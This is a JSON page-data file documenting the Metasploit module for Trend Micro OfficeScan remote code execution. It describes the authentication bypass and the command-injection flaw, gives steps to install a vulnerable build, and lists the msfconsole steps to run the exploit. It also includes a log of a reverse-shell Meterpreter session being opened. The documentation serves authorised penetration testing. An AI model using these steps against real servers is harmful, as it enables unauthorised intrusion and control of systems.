{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/trendmicro_officescan_widget_exec","result":{"data":{"moduleMetadataJson":{"id":"7e9c3c1c-9123-58cf-b2dd-f1f8c81bacb8","name":"Trend Micro OfficeScan Remote Code Execution","fullname":"exploit/windows/http/trendmicro_officescan_widget_exec","description":"This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a\n        terminal command under the context of the web server user.\n\n        The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product\n        has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which\n        leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process\n        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,\n        unauthenticated users can execute a terminal command under the context of the web server user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/trendmicro_officescan_widget_exec","documentationSlug":"/modules/documentation/exploit/windows/http/trendmicro_officescan_widget_exec","referencesSlug":"/modules/references/exploit/windows/http/trendmicro_officescan_widget_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user.</p>\n<p>The Trend Micro OfficeScan product has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the web server user.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<ol>\n<li>Open following URL <a href=\"http://downloadcenter.trendmicro.com/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://downloadcenter.trendmicro.com/</a></li>\n<li>Find \"OfficeScan\" and click.</li>\n<li>At the time of writing this documentation, you must see \"osce-xg-win-en-gm-b1315.exe\" next to Download button.</li>\n<li>Click to the download button and complete installation of ISO.</li>\n<li>Install the downloaded file on Windows operating system. (Tested with Windows 7)</li>\n</ol>\n<p>If you don't see an affected version of OfficeScan, you can try to download it directly from following URL.</p>\n<p><a href=\"http://download.trendmicro.com/products/officescan/XG/osce_xg_win_en_gm_b1315.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://download.trendmicro.com/products/officescan/XG/osce<em>xg</em>win<em>en</em>gm_b1315.exe</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start <code class=\"language-text\">msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">use exploit/windows/http/trendmicro_officescan_widget_exec</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">RHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set <code class=\"language-text\">LHOST</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run <code class=\"language-text\">check</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">The target is vulnerable.</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Run <code class=\"language-text\">exploit</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are seeing <code class=\"language-text\">Authenticated successfully bypassed</code> value.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <strong>Verify</strong> that you are getting <code class=\"language-text\">meterpreter</code> session.</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"trend-micro-officescan-11-on-win7\" style=\"position:relative;\"><a href=\"#trend-micro-officescan-11-on-win7\" aria-label=\"trend micro officescan 11 on win7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Trend Micro OfficeScan 11 on Win7</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(trendmicro_officescan_widget_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Auto detection enabled. Trying to detect target system version.\n[*] Target system selected : OfficeScan 11\n[*] Exploiting authentication bypass\n[+] Authenticated successfully bypassed.\n[*] Generating payload\n[*] Trigerring command injection vulnerability\n[*] Sending stage (179267 bytes) to 12.0.0.176\n[*] Meterpreter session 9 opened (12.0.0.1:4444 -&gt; 12.0.0.176:49842) at 2017-10-09 21:57:29 +0300\n\nmeterpreter &gt; sysinfo\nComputer        : CME\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : tr_TR\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"7e9c3c1c-9123-58cf-b2dd-f1f8c81bacb8"}}}